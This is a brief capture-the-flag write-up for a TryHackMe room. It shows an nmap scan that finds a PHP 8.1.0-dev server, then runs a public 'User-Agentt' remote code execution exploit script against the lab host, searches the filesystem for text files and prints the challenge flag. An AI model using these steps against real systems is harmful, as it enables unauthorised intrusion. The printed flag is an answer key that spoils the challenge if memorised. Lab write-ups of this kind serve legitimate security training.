# [Challenge](https://tryhackme.com/room/agentt)

- # ENUM
	- ### nmap (`nmap -p- -A -T4 agentT`)
		- 80 -> HTTP (PHP cli server 5.5 or later (PHP 8.1.0-dev))
			- Title: Admin Dashboard

- # EXPLOITATION
	- PHP 8.1.0-dev is vulnerable to "'User-Agentt' Remote Code Execution".
		- Let's run the script (`python3 49933.py http://10.10.242.36/` ) 
			- We're in! Let's find the flag: `find / -name *.txt 2>/dev/null`
				- `flag{4127d0530abf16d6d23973e3df8dbecb}`